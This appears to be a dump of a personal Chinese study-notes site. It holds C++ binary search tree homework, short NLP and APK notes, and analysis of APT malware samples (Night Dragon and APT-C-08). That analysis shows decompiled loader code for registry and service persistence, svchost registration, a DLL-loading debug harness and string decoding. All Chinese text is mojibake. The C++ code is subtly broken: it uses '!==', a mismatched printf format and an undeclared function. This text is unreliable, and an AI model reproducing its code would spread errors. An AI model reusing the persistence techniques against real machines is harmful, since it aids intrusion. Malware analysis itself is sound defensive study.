pNode) { //å‰åºéå†æ‰€æœ‰æ€ªç‰©,åˆ—å‡ºæ€ªçš„åå­— if(pNode!==NULL) { pName = (char*)\u0026pNode -\u003e element; pName = pName + 8; printf(\"%d\\n\",pName); PreOrderTraverse(pNode -\u003e pLeft); PreOrderTraverse(pNode -\u003e pRight); } } template\u003cclass T\u003e void BSortTree\u003cT\u003e::PostOrderTraverse(TreeNode\u003cT\u003e* pNode) { //ååºéå†æ‰€æœ‰æ€ªç‰©,åˆ—å‡ºæ€ªçš„åå­— if(pNode!==NULL) { pName = (char*)\u0026pNode -\u003e element; pName = pName + 8; PostOrderTraverse(pNode -\u003e pLeft); PostOrderTraverse(pNode -\u003e pRight); printf(\"%d\\n\",pName); } } //å¯¹åº”å¾ªç¯éå†çš„è¯æ˜¯æœ€æ·±çš„å¯¹åº”å­èŠ‚ç‚¹ï¼Œåˆ°æœ€æ·±ååœ¨å¯¹åº”å¾ªç¯éå†ä¼šè·³è¿‡ï¼ˆå› ä¸ºpNode!==NULLï¼‰ï¼Œåé¢å°±ä¼šå¾ªç¯éå†å¯¹åº”çš„å¦ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè‡ªç„¶ä¹Ÿæ˜¯æœ€æ·±çš„ Thinkingï¼šå¦‚ä½•åŒºåˆ†äºŒå‰æ ‘è¿˜æ˜¯åŒå‘é“¾è¡¨ï¼Ÿ\nåŒå‘é“¾è¡¨ä¼šæœ‰ä¸¤ä¸ªåœ°å€æˆå‘˜ï¼Œè€Œä¸”æœ‰ä¸€ä¸ªæˆå‘˜æŒ‡å‘å‰ä¸€ä¸ªæˆå‘˜ã€‚äºŒå‰æ ‘å¦‚æœè¦æŒ‡å‘å‰ä¸€ä¸ªæˆå‘˜çš„è¯è¦æœ‰ä¸‰ä¸ªåœ°å€æˆå‘˜ï¼ˆå°±æ˜¯çˆ¶èŠ‚ç‚¹ï¼‰ã€‚\næœç´¢äºŒå‰æ ‘ å®Œæˆæœç´¢äºŒå‰æ ‘çš„åˆ é™¤åŠŸèƒ½\n#define SUCCESS 1 // æ‰§è¡ŒæˆåŠŸ\t#define ERROR\t-1 // æ‰§è¡Œå¤±è´¥\ttemplate\u003cclass T\u003e\tclass TreeNode{\tpublic:\tT element;\t//å½“å‰èŠ‚ç‚¹å­˜å‚¨çš„æ•°æ®\tTreeNode\u003cT\u003e* pLeft;\t//æŒ‡å‘å·¦å­èŠ‚ç‚¹çš„æŒ‡é’ˆ\tTreeNode\u003cT\u003e* pRight;\t//æŒ‡å‘å³å­èŠ‚ç‚¹çš„æŒ‡é’ˆ\tTreeNode\u003cT\u003e* pParent;\t//æŒ‡å‘çˆ¶ç»“ç‚¹çš„æŒ‡é’ˆ\tTreeNode(T\u0026 ele){ //åˆå§‹åŒ–NodeèŠ‚ç‚¹\tmemset(\u0026element,0,sizeof(TreeNode));\t//ä¸ºå…ƒç´ èµ‹å€¼\tmemcpy(\u0026element,\u0026ele,sizeof(T));\tpLeft = pRight = pParent = NULL;\t} //é‡è½½== æ¯”è¾ƒä¸¤ç»“ç‚¹æ˜¯å¦ç›¸ç­‰ bool operator==(TreeNode\u003cT\u003e* node){ return node-\u003eelement == element?true:false;\t} };\ttemplate\u003cclass T\u003e\tclass BSortTree{\tpublic:\tBSortTree();\t//æ„é€ å‡½æ•°\t~BSortTree();\t//ææ„å‡½æ•°\tpublic:\t//åˆ¤æ–­æ ‘æ˜¯å¦ä¸ºç©º\tbool IsEmpty();\t//æ–°å¢èŠ‚ç‚¹\tDWORD Insert(T element);\t//åˆ é™¤èŠ‚ç‚¹\tvoid Delete(T element); TreeNode\u003cT\u003e* Search(T element);\t//æŸ¥æ‰¾èŠ‚ç‚¹\tvoid InOrderTraverse(TreeNode\u003cT\u003e* pNode);\t//ä¸­åºéå†\tvoid PreOrderTraverse(TreeNode\u003cT\u003e* pNode);\t//å‰åºéå†\tvoid PostOrderTraverse(TreeNode\u003cT\u003e* pNode);\t//ååºéå†\tprivate:\tTreeNode\u003cT\u003e* GetMaxNode(TreeNode\u003cT\u003e* pNode);\t//è·å–ä»¥pNodeä¸ºæ ¹çš„æœ€å¤§èŠ‚ç‚¹\tTreeNode\u003cT\u003e* GetMinNode(TreeNode\u003cT\u003e* pNode);\t//è·å–ä»¥pNodeä¸ºæ ¹çš„æœ€å°èŠ‚ç‚¹\tTreeNode\u003cT\u003e* SearchNode(TreeNode\u003cT\u003e* pNode,T element);\t//è·å–ä»¥pNodeä¸ºæ ¹çš„æœ€å°èŠ‚ç‚¹\tDWORD InsertNode(T element, TreeNode\u003cT\u003e* pNode);\t//æ–°å¢èŠ‚ç‚¹\tTreeNode\u003cT\u003e* DeleteNode(T element, TreeNode\u003cT\u003e* pNode);\t//åˆ é™¤èŠ‚ç‚¹\tvoid Clear(TreeNode\u003cT\u003e* pNode);\t//æ¸…ç©ºæ‰€æœ‰èŠ‚ç‚¹\tprivate:\tTreeNode\u003cT\u003e* m_pRoot;\t//æ ¹ç»“ç‚¹æŒ‡é’ˆ\tint size;\t//æ ‘ä¸­å…ƒç´ æ€»ä¸ªæ•°\t};\ttemplate\u003cclass T\u003e BSortTree\u003cT\u003e::BSortTree()\t{\tm_pRoot = NULL; size = 0; }\ttemplate\u003cclass T\u003e BSortTree\u003cT\u003e::~BSortTree(){\tClear(m_pRoot); }\ttemplate\u003cclass T\u003e DWORD BSortTree\u003cT\u003e::Insert(T element)\t{\t//å¦‚æœæ ¹èŠ‚ç‚¹ä¸ºç©º if ( !m_pRoot ) { m_pRoot = new TreeNode\u003cT\u003e(element);\tsize++;\treturn SUCCESS;\t} //å¦‚æœæ ¹èŠ‚ç‚¹ä¸ä¸ºç©º return InsertNode(element, m_pRoot); }\ttemplate\u003cclass T\u003e DWORD BSortTree\u003cT\u003e::InsertNode(T element, TreeNode\u003cT\u003e* pNode)\t{\t//å°†å…ƒç´ å°è£…åˆ°èŠ‚ç‚¹ä¸­ TreeNode\u003cT\u003e* pNewNode = new TreeNode\u003cT\u003e(element); //å¦‚æœelement == å½“å‰èŠ‚ç‚¹ ç›´æ¥è¿”å› if(element == pNode-\u003eelement) { return SUCCESS;\t} //å¦‚æœpNodeçš„å·¦å­èŠ‚ç‚¹ä¸ºNULL å¹¶ä¸”element \u003c å½“å‰èŠ‚ç‚¹ if(pNode-\u003epLeft == NULL \u0026\u0026 element \u003c pNode-\u003eelement) { pNode-\u003epLeft = pNewNode;\tpNewNode-\u003epParent = pNode;\tsize++;\treturn SUCCESS;\t} //å¦‚æœpNodeçš„å³å­èŠ‚ç‚¹ä¸ºNULL å¹¶ä¸”element \u003e å½“å‰èŠ‚ç‚¹ if(pNode-\u003epRight == NULL \u0026\u0026 element \u003e pNode-\u003eelement){ pNode-\u003epRight = pNewNode;\tpNewNode-\u003epParent = pNode;\tsize++;\treturn SUCCESS;\t} //å¦‚æœelement\u003cå½“å‰èŠ‚ç‚¹ ä¸”å½“å‰èŠ‚ç‚¹çš„å·¦å­æ ‘ä¸ä¸ºç©º if(element \u003c pNode-\u003eelement) { InsertNode(element,pNode-\u003epLeft);\t} else { InsertNode(element,pNode-\u003epRight);\t} return SUCCESS; }\ttemplate\u003cclass T\u003e void BSortTree\u003cT\u003e::Clear(TreeNode\u003cT\u003e* pNode)\t{\tif(pNode!=NULL) { Clear(pNode-\u003epLeft);\tClear(pNode-\u003epRight);\tdelete pNode;\tpNode=NULL;\t} }\ttemplate\u003cclass T\u003e bool BSortTree\u003cT\u003e::IsEmpty()\t{\treturn size==0?true:false; }\ttemplate\u003cclass T\u003e TreeNode\u003cT\u003e* BSortTree\u003cT\u003e::Search(T element)\t{\treturn SearchNode(m_pRoot, element); }\ttemplate\u003cclass T\u003e TreeNode\u003cT\u003e* BSortTree\u003cT\u003e::SearchNode(TreeNode\u003cT\u003e* pNode,T element)\t{\tif(pNode == NULL)\t//å¦‚æœèŠ‚ç‚¹ä¸ºNULL\t{ return NULL;\t} else if(element == pNode-\u003eelement)\t//å¦‚æœç›¸ç­‰\t{ return pNode;\t}\t//å¦‚æœæ¯”èŠ‚ç‚¹çš„å…ƒç´ å° å‘å·¦æ‰¾\telse if(element \u003c pNode-\u003eelement) { return SearchNode(pNode-\u003epLeft,element);\t} else\t//å¦‚æœæ¯”èŠ‚ç‚¹çš„å…ƒç´ å¤§ å‘å³æ‰¾\t{ return SearchNode(pNode-\u003epRight,element);\t} }\ttemplate\u003cclass T\u003e void BSortTree\u003cT\u003e::Delete(T element)\t{\tif (m_pRoot !== NULL) { TreeNode\u003cT\u003e* ptemp = SearchNode(m_pRoot , element); DeleteNode(element, ptemp); } }\ttemplate\u003cclass T\u003e TreeNode\u003cT\u003e* BSortTree\u003cT\u003e::DeleteNode(T element,TreeNode\u003cT\u003e* pNode)\t{\tif (!pNode-\u003epLeft \u0026\u0026 !pNode-\u003epRight) { if (pNode-\u003eelement \u003c pNode-\u003epParent-\u003eelement) { pNode-\u003epParent-\u003epLeft = NULL; } else { pNode-\u003epParent-\u003epRight = NULL; } delete pNode; }else if(pNode-\u003epLeft \u0026\u0026 !pNode-\u003epRight) //æœ‰å·¦æ— å³ { if (pNode-\u003eelement \u003c pNode-\u003epParent-\u003eelement) //åœ¨çˆ¶å·¦ { pNode-\u003epParent-\u003epLeft = pNode-\u003epLeft; //çˆ¶èŠ‚ç‚¹çš„å·¦åœ°å€å†™å…¥å·¦å­™èŠ‚ç‚¹ pNode-\u003epLeft-\u003epParent = pNode-\u003epParent; //å·¦å­™èŠ‚ç‚¹çš„çˆ¶åœ°å€å†™å…¥çˆ¶èŠ‚ç‚¹çš„åœ°å€ } else //åœ¨çˆ¶å³ { pNode-\u003epParent-\u003epRight = pNode-\u003epLeft; pNode-\u003epLeft-\u003epParent = pNode-\u003epParent; } delete pNode; }else if(!pNode-\u003epLeft \u0026\u0026 pNode-\u003epRight) { if (pNode-\u003eelement \u003c pNode-\u003epParent-\u003eelement) { pNode-\u003epParent-\u003epLeft = pNode-\u003epRight; //çˆ¶èŠ‚ç‚¹çš„å·¦åœ°å€å†™å…¥å³å­™èŠ‚ç‚¹ pNode-\u003epRight-\u003epParent = pNode-\u003epParent; //å³å­™èŠ‚ç‚¹çš„çˆ¶åœ°å€å†™å…¥çˆ¶èŠ‚ç‚¹çš„åœ°å€ } else { pNode-\u003epParent-\u003epRight = pNode-\u003epRight; pNode-\u003epRight-\u003epParent = pNode-\u003epParent; } delete pNode; }else if(pNode-\u003epLeft \u0026\u0026 pNode-\u003epRight) { TreeNode\u003cT\u003e* pLeftMinNode = GetLeftMinNode(pNode-\u003epLeft); //æ‰¾åˆ°æœ€å°çš„é‚£ä¸ªèŠ‚ç‚¹ pNode-\u003eelement = pLeftMinNode-\u003eelement; //æŠŠæœ€å°çš„èŠ‚ç‚¹ä¸æˆ‘è¦åˆ çš„èŠ‚ç‚¹æ›¿æ¢å†…å®¹ DeleteNode(pLeftMinNode-\u003eelement,pLeftMinNode); //å°±æ˜¯åˆ é™¤é‚£ä¸ªæ‰¾åˆ°çš„æœ€å°çš„èŠ‚ç‚¹ } return NULL; }\t//æµ‹è¯•ä»£ç ï¼š\tvoid TestInsert()\t{\t//12 8 5 9 17 15 13 /* 12\t8\t17\t5\t9\t15\t13\t*/ BSortTree\u003cint\u003e tree; tree.Insert(12); tree.Insert(8); tree.Insert(5); tree.Insert(9); tree.Insert(17); tree.Insert(15); tree.Insert(13); }\tvoid TestSerch()\t{\t//12 8 5 9 17 15 13 BSortTree\u003cint\u003e tree; tree.Insert(12); tree.Insert(8); tree.Insert(5); tree.Insert(9); tree.Insert(17); tree.Insert(15); tree.Insert(13); TreeNode\u003cint\u003e* p = tree.Search(17); printf(\"%x %d\\n\",p,p-\u003eelement); } "},"title":"HomeworkBAS"},"/docs/remaining/ai/":{"data":{"":"","#":"NLPå®šä¹‰åŠæ­§ä¹‰æ€§ NLP = NLU + NLG NLUï¼šè¯­éŸ³/æ–‡æœ¬ -\u003e æ„æ€ï¼ˆmeaningï¼‰ NLGï¼šæ„æ€ -\u003e æ–‡æœ¬/è¯­éŸ³ æœºå™¨ç¿»è¯‘ å…ˆå‰çš„ç¿»è¯‘ç³»ç»Ÿå¯èƒ½éš¾ä»¥å»è€ƒè™‘å¥å­çš„é—®é¢˜ï¼ˆå­˜åœ¨çš„é—®é¢˜æœ‰ï¼šæ…¢ã€è¯­ä¹‰é—®é¢˜ã€ä¸Šä¸‹æ–‡ã€è¯­æ³•ã€è§„åˆ™ç»Ÿè®¡ç­‰ï¼‰\né¦–å…ˆçœ‹çœ‹å¦‚ä½•ä¿è¯è¯­æ³•çš„ï¼š\nå…ˆå°†å¥å­åˆ†æˆä¸€ä¸ªä¸ªçš„è¯ï¼ˆåˆ†è¯ï¼‰ ä¹‹åå°†è¿™ä¸€ä¸ªä¸ªçš„è¯ç¿»è¯‘ä¸ºå¯¹åº”è¯­ä¹‰çš„æœ€ç›¸ä¼¼æ¦‚ç‡çš„å•è¯ï¼ˆBroken Englishï¼‰ å°†è¿™äº›å•è¯ä»¥ä¸åŒçš„é¡ºåºæ’åˆ—ï¼ˆæ‰€æœ‰å¯èƒ½çš„ç»„åˆï¼‰ é€‰æ‹©æœ€ç¬¦åˆè¯­æ³•çš„å¥å­ï¼ˆä½¿ç”¨è¯­è¨€æ¨¡å‹LMï¼‰ è¿™æ ·åˆ†ä¸¤æ­¥ç¿»è¯‘çš„è¯è®¡ç®—é‡éå¸¸å¤§ã€‚é‚£ä¹ˆå¯ä»¥å°†è¿™ä¸¤æ­¥ï¼ˆTranslation Model | Language Modelï¼‰åˆå¹¶ã€‚\nå…¶ä¸­Translation Modelå…¶å®å°±æ˜¯ä»ç›®æ ‡å•è¯ä¸­æ‰¾æºå•è¯å¯¹åº”æ„æ€çš„æœ€ç›¸ä¼¼æ¦‚ç‡max(T) P(T|S)\nLanguage Modelå°±æ˜¯å°†è¿™äº›ç›®æ ‡å•è¯ç»„åˆæˆä¸€å¥è¯çš„æ¦‚ç‡P(S)\né‚£ä¹ˆåˆå¹¶çš„è¯å°±æ˜¯max(T) P(T|S) * P(S)çš„æœ€å¤§æ¦‚ç‡ã€‚"},"title":"AI"},"/docs/remaining/app/":{"data":{"":"","#":"APKåŸºæœ¬ç»“æ„ assetsï¼šèµ„æºæ–‡ä»¶ï¼ˆå›¾ç‰‡ã€éŸ³é¢‘ã€æ•°æ®åº“ã€ç½‘é¡µã€é…ç½®æ–‡ä»¶ç­‰ï¼‰ resï¼šèµ„æºæ–‡ä»¶ï¼Œéœ€è¦ç¼–è¯‘ï¼ˆå¸ƒå±€ï¼‰ libï¼šå„ç§å¹³å°ä¸‹ä½¿ç”¨çš„å¯¹åº”çš„soæ–‡ä»¶ META-INFï¼šç­¾åæ–‡ä»¶ resources.arscï¼šèµ„æºåŠ å¯†ï¼ˆè¯­è¨€åŒ…ï¼‰ AndroidMainfest.xmlï¼šæ¸…å•æ–‡ä»¶ï¼ˆå›¾æ ‡ã€ç•Œé¢ã€æƒé™ã€å…¥å£ï¼‰ classes.dexï¼šæºä»£ç  "},"title":"APP"},"/docs/remaining/apts/":{"data":{"":"","#":"2011.02.10 - Night Dragon ï¼ˆzwshellï¼‰è¿™ä¸ªå…¶å®æ˜¯ä¸€ä¸ªç±»ä¼¼cobalt strikeçš„ä¸€ä¸ªå·¥å…·ç”Ÿæˆçš„æ ·æœ¬ï¼Œä¸è¿‡å¥½åƒæ¯”csçš„åŠŸèƒ½å°‘ä¸€äº›ã€‚çœ‹ä¸€ä¸‹è¿™ä¸ªæ ·æœ¬çš„loaderçš„æ ¸å¿ƒéƒ¨åˆ†ï¼š\næŸ¥æ‰¾å’ŒåŠ è½½èµ„æºï¼š\nResourceA = FindResourceA(0, Name, 0xA); // åœ¨èµ„æºèŠ‚æŸ¥æ‰¾DATAç±»å‹çš„èµ„æº foundResource = ResourceA; if ( !ResourceA ) return 0; Resourcesize = SizeofResource(0, ResourceA); // è·å–èµ„æºå¤§å° Resource = LoadResource(0, foundResource); // å°†èµ„æºåŠ è½½è¿‘å†…å­˜ é”å®šå’ŒåŠ å¯†èµ„æºï¼š\nif (LockResource(Resource)) // é”å®šèµ„æº { handle_Gchunk = GlobalAlloc(0x40u, Resourcesize); // åˆ†é…å†…å­˜ Gchunkaddr = GlobalLock(handle_Gchunk); // é”å®šå†…å­˜ qmemcpy(Gchunkaddr, isLocked, Resourcesize); // æ‹·è´æ•°æ®åˆ°æ–°å†…å­˜ xorencryption(Gchunkaddr, Resourcesize); // åŠ å¯†æ•°æ® } äº’æ–¥ä½“ç®¡ç†ï¼š\nMutexA = OpenMutexA(0x100000u, 0, byte_403113); // å°è¯•æ‰“å¼€äº’æ–¥ä½“ if ( !MutexA ) { MutexA = CreateMutexA(0, 0, byte_403113); // å¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºäº’æ–¥ä½“ } è·å–æ–‡ä»¶è·¯å¾„å¹¶é‡å‘½åæ–‡ä»¶ï¼š\nGetModuleFileNameA(0, Filename, 0x105u); // è·å–å½“å‰ç¨‹åºè·¯å¾„ lstrcpyA(String1, Filename); // å¤åˆ¶åˆ° String1 æ–‡ä»¶ç§»åŠ¨/é‡å‘½åï¼š\nfor ( i = lstrlenA(String1) - 1; i \u003e= 0; String1[i--] = v10 + 2 ) { v10 = String1[i]; //å½“å‰ç¨‹åºçš„ç»å¯¹è·¯å¾„ if ( v10 == '\\\\' ) break; } if ( MoveFileA(Filename, String1) ) // å¦‚æœç§»åŠ¨æˆåŠŸ { lstrcpyA(byte_4032AC, String1); // æ›´æ–°æ–‡ä»¶è·¯å¾„ MoveFileExA(String1, 0, 4u); // å»¶è¿Ÿåˆ é™¤æ–‡ä»¶ï¼Œé‡å¯å‰æ‰ä¼šåˆ é™¤è¯¥æ–‡ä»¶ } else { lstrcpyA(byte_4032AC, Filename); MoveFileExA(Filename, 0, 4u); } æ³¨å†Œè¡¨æ“ä½œï¼š\nif ( regcreat(2u, String1, lpValueName, Filename, v16 + 1) )// å‘æ³¨å†Œè¡¨å†™å…¥æ•°æ®ï¼Œè¿›è¡ŒæŒä¹…åŒ– { ReleaseMutex(MutexA); CloseHandle(MutexA); ä¸‹é¢æ˜¯è¿™ä¸ªå‡½æ•°: char __cdecl regcreat(DWORD dwType, CHAR *lpSubKey, LPCSTR lpValueName, BYTE *lpData, DWORD cbData) { DWORD dwDisposition; // [esp+0h] [ebp-4h] BYREF dwDisposition = 2; if ( RegCreateKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0, 0, 0xF003Fu, 0, \u0026lpSubKey, \u0026dwDisposition) ) return 0; RegSetValueExA(lpSubKey, lpValueName, 0, dwType, lpData, cbData); RegCloseKey(lpSubKey); return 1; } æœåŠ¡ç®¡ç†ï¼š\nif (OpenServiceA(hSCManager, String2, 0xF01FFu)) { StartServiceA(v17, 0, 0); // å¯åŠ¨æœåŠ¡ CloseServiceHandle(v17); } è°ƒè¯•ï¼š\nåœ¨å¡«å†™æ ·æœ¬ä¿¡æ¯çš„æ—¶å€™å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªæ ·æœ¬å¯ä»¥é‡Šæ”¾ä¸€ä¸ªDLLåˆ°æŒ‡å®šçš„ç›®å½•ä¸‹ï¼Œé»˜è®¤æ˜¯%windir%\\System32\\å°±æ˜¯Windowsç›®å½•ä¸‹çš„System32æ–‡ä»¶å¤¹é‡Œé¢ï¼ˆä¸è¿‡æˆ‘å°è¯•äº†ä¸€ä¸‹ï¼Œå®ƒä¼šè‡ªåŠ¨è·‘åˆ°C:\\Windows\\SysWOW64\\ä¸‹ï¼Œå¯èƒ½é‚£ä¸ªæ—¶å€™åªæ”¯æŒ32ä½ç³»ç»Ÿå§ï¼‰ åœ¨ä¸Šé¢çš„regcreatçš„å‚æ•°ä¸­çš„String1å‚æ•°ï¼ˆå°±æ˜¯è¦ç”Ÿæˆæ³¨å†Œè¡¨çš„ç›®å½•ï¼‰ä¸ºSYSTEM\\CurrentControlSet\\Services\\FastUserSwitchingCompatibility\\Parameterså°±æ˜¯æ³¨å†Œä¸€ä¸ªå¿«é€Ÿç”¨æˆ·åˆ‡æ¢åŠŸèƒ½ï¼Œæ³¨å†Œè¡¨é”®å€¼å°±æ˜¯ä¸Šé¢çš„é‚£ä¸ªæŒ‡å®šçš„ç›®å½•è·¯å¾„ï¼Œåé¢ä¼šæ‰“å¼€FastUserSwitchingCompatibilityæœåŠ¡å®Œæˆä¸Šçº¿ã€‚ åœ¨æ–‡ä»¶é‡å‘½åçš„ç¬¬ä¸€ä¸ªforå¾ªç¯å°†ç¨‹åºçš„åç§°æ”¹ä¸ºUgtxgt0gzgï¼Œé…åˆMoveFileExAå‡½æ•°è¾¾åˆ°æ–‡ä»¶é‡å¯è‡ªåˆ é™¤ã€‚ä½†æ˜¯å¦‚æœä¸é™„åŠ è°ƒè¯•çš„æƒ…å†µä¸‹æ–‡ä»¶ä¼šç›´æ¥åˆ é™¤ğŸ§ ä½¿ç”¨svchost.exe netsvcs â€“kå°†è¿™ä¸ªDLLæ³¨å†ŒæˆæœåŠ¡ï¼›åŒæ ·çš„ä½¿ç”¨%systemroot%\\system32\\svchost.exe -k netsvcs æ³¨å†Œç½‘ç»œé€šä¿¡æœåŠ¡ çœ‹ä¸€ä¸‹ä¸Šé¢é‚£ä¸ªDLLæ–‡ä»¶çš„å¯¼å‡ºè¡¨ï¼Œå‘ç°åªæœ‰ä¸€ä¸ªå‡½æ•°ï¼ˆServiceMainï¼‰ï¼Œåˆ†æä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼š\nè¿™æ˜¯ä¸€ä¸ªDLLæ‰€ä»¥è¦å†™ä¸€ä¸ªLoaderå»åŠ è½½è¿™ä¸ªå‡½æ•°ï¼ˆç›¸åŒè·¯å¾„ä¸‹ï¼‰ï¼Œå¦‚ä¸‹ï¼š\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e typedef void (*ServiceMain)(int argc, char *argv[]); int main() { HINSTANCE hDLL = LoadLibrary(\"123.dll\"); if (hDLL == NULL) { printf(\"åŠ è½½DLLå¤±è´¥.\\n\"); return 1; } ServiceMain pServiceMain = (ServiceMain)GetProcAddress(hDLL, \"ServiceMain\"); if (pServiceMain == NULL) { printf(\"è·å–ServiceMainå‡½æ•°åœ°å€å¤±è´¥.\\n\"); FreeLibrary(hDLL); return 1; } char *args[] = {\"arg1\", \"arg2\"}; pServiceMain(2, args); FreeLibrary(hDLL); return 0; } å°†è¿™ä¸ªä»£ç ç¼–è¯‘åï¼Œæ”¾åˆ°IDAä¸­ä¸‹æ–­ç‚¹å°±å¯ä»¥äº†ã€‚\nv8 = 0; FileA = CreateFileA(Filename, 0x80000000, 1u, 0, 3u, 0, 0); //æ‰“å¼€è¿™ä¸ªDLLï¼ŒFilenameä¸ºDLLè·¯å¾„ hFile = FileA; if ( FileA != -1 ) { SetFilePointer(FileA, -737, 0, 2u); //ç§»åŠ¨æ–‡ä»¶æŒ‡é’ˆä¸ºæ–‡ä»¶æœ«å°¾737å­—èŠ‚ ReadFile(hFile, \u0026data, 737u, \u0026NumberOfBytesRead, 0); // ä»æ–‡ä»¶è¯»å–737å­—èŠ‚åˆ°dataã€‚ CloseHandle(hFile); de_code(\u0026data, 737); //è§£å¯† v8 = data == 321148776; if ( data == 321148776 ) //æ˜¯å¦è§£å¯†æˆåŠŸhW$ { if ( byte_100264B8 ) //sign { NumberOfBytesRead = 4; lstrcpyA(String1, lpString2); lstrcatA(String1, aPolicyagent); RegSet_func(4u, String1, Start_s, \u0026NumberOfBytesRead, 4u); ServiceStatus.dwServiceType = 0; ServiceStatus.dwCurrentState = 1; memset(\u0026ServiceStatus.dwControlsAccepted, 0, 20); OpenService_func(aPolicyagent, \u0026ServiceStatus); } DeleteFileA(byte_100264B9); //åˆ é™¤Ugtxgt0gzgæ–‡ä»¶ lstrcpyA(String1, lpString2); //SYSTEM\\\\CurrentControlSet\\\\Services\\\\ lstrcatA(String1, ServiceName); //FastUserSwitchingComp|atibilityè¿™åé¢çš„å­—ç¬¦ä¸²ä¸‹é¢ä»£ç ä¼šåŠ ä¸Š NumberOfBytesRead = 2; RegSet_func(4u, String1, Start_s, \u0026NumberOfBytesRead, 4u); NumberOfBytesRead = 272; RegSet_func(4u, String1, ValueName, \u0026NumberOfBytesRead, 4u); v1 = lstrlenA(\u0026byte_1002634A); RegSet_func(1u, String1, aDisplayname, \u0026byte_1002634A, v1 + 1); v2 = lstrlenA(\u0026byte_100263A5); RegSet_func(1u, String1, aDescription, \u0026byte_100263A5, v2 + 1); sub_10002061(); } if ( v0 ) { v0 = OpenMutexA(0x100000u, 0, Name); //å°±æ˜¯DLLçš„åå­—ä½œä¸ºäº’æ–¥ä½“åå­— if ( !v0 ) { MutexA = CreateMutexA(0, 0, Name); v0 = RegisterServiceCtrlHandlerA(ServiceName, HandlerProc); //æ³¨å†ŒæœåŠ¡æ§åˆ¶å¥æŸ„FastUserSwitchingCompatibility hServiceStatus = v0; if ( v0 ) { SetServiceStatus_func(2u); //æœåŠ¡æ­£åœ¨å¯åŠ¨ SetServiceStatus_func(4u); //æœåŠ¡æ­£åœ¨è¿è¡Œ sub_10003F70(0); //ç½‘ç»œè¿æ¥ SetServiceStatus_func(3u); //æœåŠ¡æ­£åœ¨åœæ­¢ SetServiceStatus_func(1u); //æœåŠ¡å·²åœæ­¢ ReleaseMutex(MutexA); LOBYTE(v0) = CloseHandle(MutexA); } } } return v0; } int __stdcall sub_10003F70(int a1) { HANDLE Thread; // eax struct WSAData WSAData; // [esp+10h] [ebp-190h] BYREF WSAStartup(0x202u, \u0026WSAData); //åˆå§‹åŒ– Winsock åº“ï¼ŒWinsock 2.2 sub_10001BD8(\u0026unk_100262D0); time1 = GetTickCount() - 30000; //æ—¶é—´å‡å»30s while ( ServiceStatus.dwCurrentState != 1 ) //æœåŠ¡åœæ­¢å°±è·³å‡º { if ( ServiceStatus.dwCurrentState == 3 ) //æœåŠ¡æ­£åœ¨åœæ­¢å°±break break; if ( GetTickCount() - time1 \u003e 0x7530 ) //éš”30s { if ( ThreadId ) { sub_10001D39(\u0026unk_100262D0, 20483, 0, 0, dword_1002661D, 0, 0); //æ˜¯é‡Šæ”¾å†…å­˜å—ï¼Ÿ } else { Thread = CreateThread(0, 0, sub_10003BD7, 0, 0, \u0026ThreadId); //sub_10003BD7è¿œç¨‹æ§åˆ¶å‡½æ•° CloseHandle(Thread); } dword_10026621 = GetTickCount(); } Sleep(1u); } sub_10001BE4(\u0026unk_100262D0); //ç»“æŸ WSACleanup(); return 0; } æ ¸å¿ƒåŠŸèƒ½å°±å·®ä¸å¤šäº†ã€‚\n2024.12.9 - APT-C-08ï¼ˆè”“çµèŠ±ï¼‰ åˆ›å»ºäº’æ–¥ä½“ï¼ˆrabadaisuniqueï¼‰é˜²æ­¢å¤šå¼€ï¼š\nMutexA = CreateMutexA(0i64, 1, \"rabadaisunique\"); if ( GetLastError() == 183 || GetLastError() == 5 ) { CloseHandle(MutexA); return 1; } æ–­åˆ°å‡½æ•°isalpha(*v9)å¯ä»¥çœ‹åˆ°*v9é‡Œé¢æ˜¯å­—ç¬¦ä¸²emj.rqgjlgu\\\\yrybkypempn\\\\:Açš„å€’è½¬ï¼Œè€Œä¸”åé¢çš„å¾ªç¯åˆ¤æ–­while ( v9 != v10 )ä¸­v10 = 0ï¼Œå¯ä»¥åŒ–ç®€åé¢çš„ä»£ç é€»è¾‘ï¼Œè§£å¯†å¦‚ä¸‹ï¼š\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cwindows.h\u003e void process_buffer(char *v9, char *v10) { while (v9 != v10) { if (isalpha(*v9)) { if ((*v9 \u003e= 'a') \u0026\u0026 (*v9 \u003c= 'z')) { *v9 = (*v9 - '_') % 26 + 'a'; } else if ((*v9 \u003e= 'A') \u0026\u0026 (*v9 \u003c= 'Z')) { *v9 = (*v9 - '?') % 26 + 'A'; } } else if (isdigit(*v9)) { *v9 = (*v9 - '.') % 10 + '0'; } v9++; } } int main() { char test1[50] = \"A:\\\\npmepykbyry\\\\ugljgqr.jme\"; char test2[50] = \"0\"; process_buffer(test1, test1 + strlen(test1)); process_buffer(test2, test2 + strlen(test2)); printf(\"%s %s\", test1, test2); return 0; } æ‰§è¡Œç»“æœä¸ºï¼šC:\\programdata\\winlist.log 2ï¼ˆæ­£å¸¸è§£å¯†ç»“æœä¸ºC:\\programdata\\winlist.logï¼‰\nåŒæ ·å‘æ–¹æ³•ï¼Œåé¢çš„è§£å¯†å­—ç¬¦ä¸²ä¸ºemj.cqgpns\\\\yrybkypempn\\\\:Aï¼ˆC:\\programdata\\uprise.logï¼‰ï¼Œrvr.cryb\\\\yrybkypempn\\\\:Aï¼ˆC:\\programdata\\date.txtï¼‰ï¼Œrvr.ppc\\\\yrybkypempn\\\\:Aï¼ˆC:\\programdata\\err.txtï¼‰\nè·å–ç³»ç»Ÿæ—¶é—´ï¼Œå°†ç³»ç»Ÿæ—¶é—´è½¬ä¸ºæ—¶é—´æˆ³ï¼Œè·å–è®¡ç®—æœºåç§°ï¼Œè·å–ç”¨æˆ·åç§°ï¼š\nGetSystemTime(\u0026SystemTime); SystemTimeToFileTime(\u0026SystemTime, \u0026FileTime); nSize = 512; GetComputerNameW(Buffer, \u0026nSize); nSize = 512; GetUserNameW(aErr_1, \u0026nSize); 